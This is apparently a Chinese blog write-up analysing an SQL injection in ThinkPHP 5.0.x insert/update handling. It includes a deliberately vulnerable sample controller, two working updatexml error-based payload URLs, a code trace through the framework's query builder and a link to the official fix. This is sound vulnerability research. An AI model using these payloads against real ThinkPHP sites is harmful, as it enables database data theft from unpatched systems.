# ThinkPHP5.0.x SQL注⼊

Author: H3rmesk1t

Data: 2021.08.09

# 漏洞描述
尽管`ThinkPHP 5.0.x框架`采用了参数化查询方式来操作数据库，但是在 `insert` 和 `update` 方法中，传入的参数可控，且无严格过滤，最终导致SQL注入漏洞发生
# 初始配置
- 这里利用`ThinkPHP5.0.14`做示例，[戳此进行下载](http://www.thinkphp.cn/download/1107.html)
- 下载后的源码中，需要对`Application\index\controller\Index.php`内容进行修改

```php
<?php
namespace app\index\controller;
use think\Db;

class Index
{
    public function index()
    {
        $name = input("get.name/a");
        Db::table("users")->where(["id"=>1])->insert(["username"=>$name]);
        return '<style type="text/css">*{ padding: 0; margin: 0; } .think_default_text{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"<h1>:)</h1><pThinkPHP V5<br/><span style="font-size:30px">十年磨一剑 - 为API开发设计的高性能框架</span></p><span style="font-size:22px;">[ V5.0 版本由 <a href="http://www.qiniu.com" target="qiniu">七牛云</a独家赞助发布 ]</span></div><script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script><script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"></script><thinkad id="ad_bd568ce7058a1091"></thinkad>';
    }
}
```

配置数据库相关文件，并开启thinkphp的调试功能

![在这里插入图片描述](https://img-blog.csdnimg.cn/390fa95b211f44de8894013f8d5c7507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/1ed1cde777ce474d8df1b1a50e688c24.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 漏洞利用

Payload：
```nash
http://127.0.0.1/cms/public/index.php/index/index/index?name[0]=inc&name[1]=updatexml(1,concat(0x7,user(),0x7e),1)&name[2]=1
或者
http://127.0.0.1/cms/public/index.php/index/index/index?name[0]=dec&name[1]=updatexml(1,concat(0x7,user(),0x7e),1)&name[2]=1
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/bd5215d598004de2b117678593b05e3c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 漏洞分析
## ThinkPHP5.0.x目录结构

```less
thinkphp  应用部署目录
├─application           应用目录（可设置）
│  ├─common             公共模块目录（可更改）
│  ├─index              模块目录(可更改)
│  │  ├─config.php      模块配置文件
│  │  ├─common.php      模块函数文件
│  │  ├─controller      控制器目录
│  │  ├─model           模型目录
│  │  ├─view            视图目录
│  │  └─ ...            更多类库目录
│  ├─command.php        命令行工具配置文件
│  ├─common.php         应用公共（函数）文件
│  ├─config.php         应用（公共）配置文件
│  ├─database.php       数据库配置文件
│  ├─tags.php           应用行为扩展定义文件
│  └─route.php          路由配置文件
├─extend                扩展类库目录（可定义）
├─public                WEB 部署目录（对外访问目录）
│  ├─static             静态资源存放目录(css,js,image)
│  ├─index.php          应用入口文件
│  ├─router.php         快速测试文件
│  └─.htaccess          用于 apache 的重写
├─runtime               应用的运行时目录（可写，可设置）
├─vendor                第三方类库目录（Composer）
├─thinkphp              框架系统目录
│  ├─lang               语言包目录
│  ├─library            框架核心类库目录
│  │  ├─think           Think 类库包目录
│  │  └─traits          系统 Traits 目录
│  ├─tpl                系统模板目录
│  ├─.htaccess          用于 apache 的重写
│  ├─.travis.yml        CI 定义文件
│  ├─base.php           基础定义文件
│  ├─composer.json      composer 定义文件
│  ├─console.php        控制台入口文件
│  ├─convention.php     惯例配置文件
│  ├─helper.php         助手函数文件（可选）
│  ├─LICENSE.txt        授权说明文件
│  ├─phpunit.xml        单元测试配置文件
│  ├─README.md          README 文件
│  └─start.php          框架引导文件
├─build.php             自动生成定义文件（参考）
├─composer.json         composer 定义文件
├─LICENSE.txt           授权说明文件
├─README.md             README 文件
├─think                 命令行入口文件
```
## Payload说明
Payload：`http://127.0.0.1/cms/public/index.php/index/index/index?name[0]=inc&name[1]=updatexml(1,concat(0x7,user(),0x7e),1)&name[2]=1`
```ha
http://localhost/thinkphp/  public/        index.php/   index/   index/   index
       域名       网站目录    对外访问目录    入口文件       前台     控制器    方法名
```
## Application\index\controller\Index.php补充代码说明

```php
$name = input("get.name/a");
input()为TP框架的助手函数，get.name/a 表示获取get传入的name变量，并将其强制转换为数组类型
```

```php
Db::table("users")->where(["id"=>1])->insert(["username"=>$name]);
TP框架采用的是PDO方式对数据库进行查询
```
## 本地代码审计

首先通过TP框架的助手函数`input`获取到参数，name变量情况如下

![在这里插入图片描述](https://img-blog.csdnimg.cn/a40079999bc945c88e1c3b0789c88f62.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

跟进`thinkphp/library/think/db/Query.php`中的`where`方法，再跟进`insert`方法，找到`$sql = $this->builder->insert($data, $options, $replace);`，跟进去

![在这里插入图片描述](https://img-blog.csdnimg.cn/a3e9fa12a7ec41c7b4385048f1229346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

跟进到`thinkphp/library/think/db/Builder.php`，找到`$data = $this->parseData($data, $options);`，跟进去

![在这里插入图片描述](https://img-blog.csdnimg.cn/4576f60006e34634a1d4c21d25e03386.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

跟进`parseData`方法，可以看出`$val`是数组，且根据`$val[0]`值为inc，通过switch语句进入`parseKey`方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/325df7e466f64041941961e11cea3960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

跟进`thinkphp/library/think/db/builder/Mysql.php`的`parseKey`方法，此处并未对传入的`$key`进行更多的过滤与检查，最后返回的仍然是`1 and (updatexml(1,concat(0x7,user(),0x7e),1))`

![在这里插入图片描述](https://img-blog.csdnimg.cn/bfcafb742dc64f599be387989ec03ec7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

回到`parseData`方法，`floatval($val[2])`返回`1`，这也正是Payload传入`username[2]=1`的原因，将其与前面经过`parseKey`方法的结果进行拼接后返回给result


![在这里插入图片描述](https://img-blog.csdnimg.cn/7281229d1a9b40a28b9a0fa5801abd22.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

回到`thinkphp/library/think/db/Builder.php`的`insert`方法中，可以看到返回的`$sql`成功造成了sql注入

![在这里插入图片描述](https://img-blog.csdnimg.cn/3d249e779c284385bb93b91e92ab4927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

# 漏洞修复

- 参考官方commit：[https://github.com/top-think/framework/commit/363fd4d90312f2cfa427535b7ea01a097ca8db1b](https://github.com/top-think/framework/commit/363fd4d90312f2cfa427535b7ea01a097ca8db1b)
- 在进行dec和inc操作之前对`$val[1]`的值进行了再次确认

![在这里插入图片描述](https://img-blog.csdnimg.cn/c5228fad76194f18b24b91b8e911ec8c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
